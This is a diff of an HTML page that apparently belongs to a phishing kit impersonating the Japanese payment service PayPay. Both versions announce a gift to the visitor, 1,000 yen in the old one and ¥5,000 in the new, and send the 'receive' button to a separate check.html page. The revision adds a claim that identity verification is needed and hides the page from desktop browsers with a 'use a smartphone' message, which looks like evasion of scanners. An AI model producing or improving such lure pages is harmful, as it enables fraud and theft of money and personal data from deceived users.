@@ -8,110 +8,84 @@
     body {
       margin: 0;
       font-family: "Helvetica Neue", sans-serif;
-      background: url('https://i.imgur.com/X9ZrGsd.png') no-repeat center center fixed;
-      background-size: cover;
+      background-color: #f5f5f5;
+      color: #333;
+    }
+
+    .header {
+      background-color: #e60012;
       color: white;
+      padding: 20px;
       text-align: center;
+      font-weight: bold;
+      font-size: 20px;
     }
 
     .container {
+      max-width: 400px;
+      margin: 30px auto;
+      background: #fff;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
       padding: 30px 20px;
+      text-align: center;
     }
 
-    .profile {
-      margin-top: 30px;
-    }
-
-    .profile img {
-      width: 70px;
-      height: 70px;
-      border-radius: 50%;
-      border: 2px solid white;
-    }
-
-    .sender {
-      margin-top: 10px;
-      font-size: 14px;
-      opacity: 0.9;
+    .logo {
+      font-size: 24px;
+      color: #e60012;
+      font-weight: bold;
+      margin-bottom: 10px;
     }
 
     .amount {
-      font-size: 48px;
-      font-weight: bold;
-      margin: 20px 0 10px;
-    }
-
-    .thankyou {
       font-size: 28px;
       font-weight: bold;
-      background: linear-gradient(90deg, #ff77d2, #76ffff);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      margin-bottom: 20px;
-    }
-
-    .tag {
-      background: gold;
-      color: black;
-      padding: 5px 12px;
-      border-radius: 20px;
-      font-weight: bold;
-      font-size: 12px;
-      display: inline-block;
-      margin-bottom: 8px;
-    }
-
-    .datetime {
-      font-size: 12px;
-      opacity: 0.8;
-      margin-bottom: 20px;
+      margin: 10px 0;
     }
 
     .button {
-      display: block;
-      width: 80%;
-      margin: 10px auto;
-      padding: 12px 0;
-      font-size: 16px;
-      border-radius: 8px;
-      border: none;
-    }
-
-    .accept {
-      background: #0070cc;
+      background-color: #e60012;
       color: white;
+      font-size: 18px;
+      padding: 12px 0;
+      width: 100%;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
     }
 
-    .decline {
-      background: white;
-      color: #333;
-      border: 1px solid #ccc;
-    }
-
-    .detail {
+    .note {
       font-size: 12px;
-      margin-top: 30px;
-      opacity: 0.7;
+      color: #888;
+      margin-top: 15px;
+    }
+
+    @media screen and (min-width: 768px) {
+      .container {
+        display: none;
+      }
+      body::before {
+        content: "スマートフォンからアクセスしてください。";
+        display: block;
+        text-align: center;
+        margin-top: 100px;
+        font-size: 18px;
+        color: red;
+      }
     }
   </style>
 </head>
 <body>
 
+  <div class="header">PayPay ギフト受け取り</div>
+
   <div class="container">
-    <div class="profile">
-      <img src="https://i.imgur.com/uIgDDDd.png" alt="user">
-      <div class="sender">ペイタからの受け取り<br>2025年7月2日 17時15分</div>
-    </div>
-
-    <div class="amount">1,000円</div>
-    <div class="thankyou">Thank You</div>
-    <div class="tag">受け取り待ち</div>
-    <div class="datetime">受取期限 2025年7月5日 17時15分</div>
-
-    <button class="button accept" onclick="location.href='check.html'">受け取る</button>
-    <button class="button decline">辞退する</button>
-
-    <div class="detail">PayPayマネーライト　500円</div>
+    <div class="logo">PayPay</div>
+    <p>ギフトが届きました</p>
+    <div class="amount">¥5,000</div>
+    <button class="button" onclick="location.href='check.html'">受け取る</button>
+    <div class="note">※受け取りには本人確認が必要です</div>
   </div>
 
 </body>
